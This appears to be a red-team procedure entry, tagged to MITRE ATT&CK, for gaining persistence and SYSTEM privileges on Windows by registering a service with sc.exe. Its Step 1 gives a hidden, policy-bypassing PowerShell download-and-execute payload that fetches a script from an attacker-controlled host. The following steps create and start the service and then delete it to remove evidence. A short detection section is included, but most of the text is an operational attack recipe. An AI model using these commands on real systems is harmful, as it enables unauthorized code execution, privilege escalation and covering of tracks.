---
id: d50d18ce-c21c-4aa6-902c-29900c770791
name: Create-and-Run-Windows-Service-as-SYSTEM-Administrator
type: procedure
verified: true
submitted: false
created_at: '2020-04-28T21:10:21.136000+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/New-Service|T1050 - New Service]]'
sub_techniques: []
tags:
  - '[[tags/administrator]]'
  - '[[tags/persistence]]'
commands:
  - '[[commands/Create-a-Windows-Service]]'
  - '[[commands/Delete-a-Windows-Service]]'
  - '[[commands/Start-a-Windows-Service]]'
platforms:
  - Windows
tools: []
validated: true
---

# Create-and-Run-Windows-Service-as-SYSTEM-Administrator

## Summary

This procedure creates a Windows service configured to execute a specified script or program with SYSTEM privileges upon starting. It leverages the 'sc.exe' utility to register and start the service, allowing for persistence or privilege escalation after obtaining Administrator access. Note that this method is a non-standard 'hack' that may generate error messages in the service logs, but the target script will still execute successfully under the SYSTEM context.

## Description

In Windows environments, services running under the SYSTEM account provide a powerful vector for attackers to achieve elevated execution after initial Administrator compromise. This procedure registers a new service using 'sc.exe create', specifying a binary path to a batch file or executable that runs the desired payload. Starting the service triggers execution as SYSTEM, enabling actions like downloading and running remote scripts. This technique is useful for maintaining persistence or escalating from Administrator to SYSTEM without traditional service development. It maps to MITRE ATT&CK technique T1050 (New Service) under Persistence (TA0003) and Privilege Escalation (TA0004) tactics. Potential error messages (e.g., service not responding) can be ignored as they do not indicate failure of the payload execution.

## Requirements

1. Administrator privileges on the target Windows system (local or remote via tools like PsExec).
2. Access to the command prompt (cmd.exe) on the target.
3. A prepared payload script or program (e.g., a batch file that downloads and executes PowerShell code).
4. Network access if the payload involves remote downloads (e.g., to an attacker-controlled server).
5. Windows platform (tested on Windows 7+).

## Defense

Defensive measures and detection strategies:

- Monitor service creation events via Windows Event Logs (Event ID 7045 for new services).
- Implement application whitelisting (e.g., AppLocker) to restrict execution of unsigned scripts or binaries.
- Enable detailed auditing for service management (Group Policy: Computer Configuration > Windows Settings > Security Settings > Local Policies > Audit Policy > Audit object access).
- Use endpoint detection tools to alert on 'sc.exe' executions with unusual binpath parameters.
- Regularly review running services for suspicious entries (e.g., via 'sc query' or Task Manager).

## Objectives

1. Register a custom service that executes a payload as SYSTEM.
2. Start the service to trigger payload execution with elevated privileges.
3. Optionally remove the service to cover tracks.
4. Achieve persistence or perform post-exploitation actions under SYSTEM context.

## Instructions

### Step 1: Prepare the Payload Script

**Context**: Create a batch file containing the payload to be executed by the service. This example uses a batch script that bypasses PowerShell execution policy, hides the window, and downloads/executes a remote script. Save this as a file (e.g., C:\Windows\Tasks\runme.bat) on the target or a accessible path.

**Code** ([[codes/Batch-Download-and-Execute-PowerShell-Script]]):

```batch
@ECHO OFF
powershell -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
```

> This step ensures the payload is ready. The batch file will run silently and fetch the PowerShell script from your controlled server. Verify the file path is writable and accessible.

### Step 2: Create the Service

**Context**: Use 'sc.exe' to register a new service pointing to the payload script. This binds the service to the binpath, allowing it to run as SYSTEM when started.

**Command** ([[commands/Create-a-Windows-Service]]):

```command_prompt
sc.exe create $_SERVICE_NAME binpath= "$_PATH\$_PROGRAM"
```

> Replace $_SERVICE_NAME with a innocuous name (e.g., pwnSVC), $_PATH with the directory (e.g., C:\Windows\Tasks), and $_PROGRAM with the filename (e.g., runme.bat). Success is indicated by '[SC] CreateService SUCCESS'. If the path contains spaces, ensure quotes are used.

### Step 3: Start the Service

**Context**: Initiate the service to execute the payload under SYSTEM privileges. Monitor for any errors, but confirm payload execution via callbacks or file drops.

**Command** ([[commands/Start-a-Windows-Service]]):

```command_prompt
sc.exe start $_SERVICE_NAME
```

> Use the same $_SERVICE_NAME as in Step 2. Expected output shows service state as START_PENDING with a PID. The payload should execute immediately; errors in service status do not prevent this.

### Step 4: (Optional) Clean Up the Service

**Context**: Delete the service after use to remove evidence and avoid detection.

**Command** ([[commands/Delete-a-Windows-Service]]):

```command_prompt
sc.exe delete $_SERVICE_NAME
```

> Run this after confirming payload success. Output should show '[SC] DeleteService SUCCESS'. Restart the system if needed to fully remove traces.
